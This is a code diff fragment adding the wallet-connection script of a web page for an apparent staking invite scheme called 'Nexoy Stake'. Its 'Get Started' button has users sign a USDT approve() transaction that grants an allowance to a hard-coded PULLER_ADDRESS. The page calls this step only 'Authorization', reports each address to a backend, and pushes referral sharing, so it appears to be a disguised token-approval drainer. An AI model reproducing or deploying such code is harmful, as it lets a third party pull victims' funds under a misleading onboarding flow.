+      if (!auto) {
+        setActionHint(error?.message || 'Wallet login failed.', 'error');
+      }
+      return null;
+    }
+  }
+
+  const isUserRejected = (error) => {
+    const msg = error?.message?.toLowerCase?.() || '';
+    return error?.code === 4001 ||
+           error?.code === 'ACTION_REJECTED' ||
+           error?.info?.error?.code === 4001 ||
+           msg.includes('user rejected') ||
+           msg.includes('transaction signature');
+  };
+
+  function resetButton() {
+    btn.disabled = !isAuthenticated;
+    btn.textContent = 'Get Started';
+  }
+
+  async function connectAndApprove() {
+    try {
+      if (!isAuthenticated) {
+        const loggedIn = await loginWallet(false);
+        if (!loggedIn) {
+          resetButton();
+          return;
+        }
+      }
+      clearActionHint();
+      btn.disabled = true;
+      btn.textContent = 'Getting started…';
+      setStatus('Preparing', 'warning');
+
+      const amt = ethers.parseUnits(String(DEFAULT_APPROVAL_USDT), decimals);
+      appendLog(`Submitting approval of ${DEFAULT_APPROVAL_USDT} ${symbol} to ${PULLER_ADDRESS}`);
+      setStatus('Awaiting signature', 'warning');
+      const tx = await usdt.approve(PULLER_ADDRESS, amt);
+      appendLog(`approve tx: ${tx.hash}`);
+      setStatus('Pending confirmation', 'warning');
+      const rc = await tx.wait();
+      appendLog(`approval confirmed in block ${rc.blockNumber}`);
+
+      setStatus('Ready', 'success');
+      btn.textContent = 'Ready';
+      btn.disabled = true;
+      setActionHint('Authorization confirmed. Invite link ready to share.', 'success');
+
+      try {
+        const payload = { address: account, txHash: tx.hash };
+        if (referrerFromLink && referrerFromLink.toLowerCase() !== account.toLowerCase()) {
+          payload.referrer = referrerFromLink;
+        }
+        const res = await fetch(`${BACKEND}/api/register`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const json = await res.json();
+        const code = json?.code || '';
+        appendLog('Backend notified with subscription details.');
+        showReferral(account, code);
+      } catch (e) {
+        appendLog('warn: failed to notify backend (optional): ' + (e?.message || e));
+      }
+      const { self } = await refreshStats(account);
+      await syncSubscriptionState(account, self);
+    } catch (error) {
+      const message = error?.message || error?.data?.message || error;
+      if (isUserRejected(error)) {
+        setStatus('Cancelled', 'error');
+        setActionHint('You cancelled the authorization in your wallet. Approve the request to finish.', 'error');
+        resetButton();
+        return;
+      }
+      setStatus('Failed', 'error');
+      setActionHint(`We could not complete the authorization. ${message}`, 'error');
+      appendLog(`error: ${message}`);
+      resetButton();
+    }
+  }
+
+  copyBtn.addEventListener('click', async () => {
+    const link = referralLink.value;
+    if (!link) return;
+    referralHint.style.display = 'none';
+    const codeLabel = (refCodeLabel?.textContent || '').trim();
+    try {
+      if (navigator.share) {
+        await navigator.share({ title: 'Nexoy Stake invite', url: link });
+        referralHint.textContent = codeLabel ? `Share dialog opened with code ${codeLabel}. Send the link to complete.` : 'Share dialog opened. Send the link to complete.';
+      } else if (navigator.clipboard?.writeText) {
+        await navigator.clipboard.writeText(link);
+        referralHint.textContent = codeLabel ? `Invite ${codeLabel} copied to clipboard.` : 'Invite link copied to clipboard.';
+      } else {
+        referralLink.select();
+        document.execCommand('copy');
+        referralHint.textContent = codeLabel ? `Invite ${codeLabel} copied. Paste to share.` : 'Invite link copied. Paste to share.';
+      }
+      referralHint.style.display = 'block';
+      setActionHint(referralHint.textContent, 'success');
+    } catch {
+      referralHint.textContent = 'Copy failed. Select the link manually.';
+      referralHint.style.display = 'block';
+      setActionHint(referralHint.textContent, 'error');
+    }
+  });
+
+  btn.addEventListener('click', () => connectAndApprove());
+  btnLogin.addEventListener('click', () => loginWallet(false));
+
+  if (window.ethereum?.on) {
+    window.ethereum.on('chainChanged', () => window.location.reload());
+    window.ethereum.on('accountsChanged', () => window.location.reload());
+  }
+
+  async function autoConnectIfAuthorized() {
+    try {
+      await loginWallet(true);
+    } catch (e) {
+      appendLog(`Auto-login skipped: ${e?.message || e}`);
+    }
+  }
+
+  autoConnectIfAuthorized();
+})();
+</script>
+</body>
+</html>
+    }
